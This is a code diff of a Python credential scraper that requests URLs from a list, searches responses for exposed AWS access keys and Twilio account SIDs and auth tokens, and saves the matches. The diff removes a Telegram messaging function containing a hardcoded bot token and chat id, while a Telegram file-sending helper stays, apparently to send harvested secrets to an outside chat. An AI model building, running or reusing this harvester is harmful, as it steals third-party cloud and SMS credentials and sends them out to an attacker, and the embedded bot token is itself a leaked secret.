@@ -16,18 +16,6 @@ def send_telegram_file(file_path, caption):
         response = requests.post(url, data=data, files=files)
     return response
 
-def send_telegram_message(message):
-    url = f"https://api.telegram.org/bot6258586547:AAFhXNBPJDCRQJ-1Mmj0OkSG3mHvmAbmk-0/sendMessage"
-    payload = {
-        'chat_id': 5981225273,
-        'text': message
-    }
-    headers = {
-        'Content-Type': 'application/json'
-    }
-    response = requests.post(url, json=payload, headers=headers)
-    return response
-
 def parse_aws_credentials(url: str, response_body: str) -> None:
     matched: bool = False
     access_keys = re.findall(
@@ -58,11 +46,11 @@ def parse_aws_credentials(url: str, response_body: str) -> None:
 def parse_twilio_credentials(url: str, response_body: str) -> None:
     matched: bool = False
     account_sids = re.findall(
-        pattern=r'(?<=[\'\"]|sid=|sid:)(AC[a-zA-Z0-9]{32})(?=[\'\"])',
+        pattern=r'(?<=[\'\"])AC[a-z0-9A-Z]{32}(?=[\'\"])',
         string=response_body
     )
     auth_tokens = re.findall(
-        pattern=r'(?<=[\'\"]|token=|token:)([a-zA-Z0-9]{32})(?=[\'\"])',
+        pattern=r'(?<=[\'\"])[a-z0-9A-Z]{32}(?=[\'\"])',
         string=response_body
     )
     for account_sid in list(set(account_sids)):
@@ -79,7 +67,7 @@ def parse_twilio_credentials(url: str, response_body: str) -> None:
                  f.write(f'{url}\n')
 
 def request_url(url: str) -> None:
-    try:
+    #try:
         response = requests.get(
             url=url,
             timeout=70,
@@ -90,12 +78,12 @@ def request_url(url: str) -> None:
         )
         if re.search('(?<=[\'\"])AKIA[0-9A-Z]{16}(?=[\'\"])', response.text):
             parse_aws_credentials(url, response.text)
-        elif re.search('(?<=[\'\"]|sid=|sid:)(AC[a-zA-Z0-9]{32})(?=[\'\"])', response.text):
+        elif re.search('(?<=[\'\"])AC[a-z0-9A-Z]{32}(?=[\'\"])', response.text):
             parse_twilio_credentials(url, response.text)
         else:
             print(f'{url} - No AWS or Twilio credentials found')
-    except Exception as e:
-        print(f'{url} - {e.__class__.__name__}')
+    #except Exception as e:
+        #print(f'{url} - {e.__class__.__name__}')
 
 def main() -> None:
     urls = open(input('Enter file path: '), 'r').read().splitlines()
